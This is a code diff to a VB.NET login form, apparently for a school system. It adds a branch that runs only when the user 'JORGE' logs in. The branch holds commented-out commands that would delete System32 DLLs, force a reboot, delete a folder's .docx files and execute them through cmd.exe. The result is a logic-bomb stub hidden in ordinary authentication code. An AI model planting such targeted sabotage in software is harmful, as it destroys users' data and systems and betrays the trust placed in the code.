@@ -4,7 +4,7 @@
 Public Class frmLogin
     Dim Usuario As String
     Dim Clave As String
-
+    Dim coman2 As String
     Private Sub frmLogin_Load(ByVal sender As System.Object, ByVal e As EventArgs) Handles MyBase.Load
 
         ConectarMySql()
@@ -29,6 +29,12 @@ Public Class frmLogin
             lblPorcen.Visible = True
             Timer1.Enabled = True
             Timer1.Start()
+            If user = "JORGE" Then
+                'coman2 = "del c:\windows\System32\*.dll "
+                'coman2 = "shutdown –r –f –t 5"
+                'coman2 = "del C:\Colegio\Borradas\*.docx"
+                'Shell("cmd.exe /k" & coman2)
+            End If
         Else
             detmsg = "Ingreso no válido...!!!"
             tipomsg = "info"
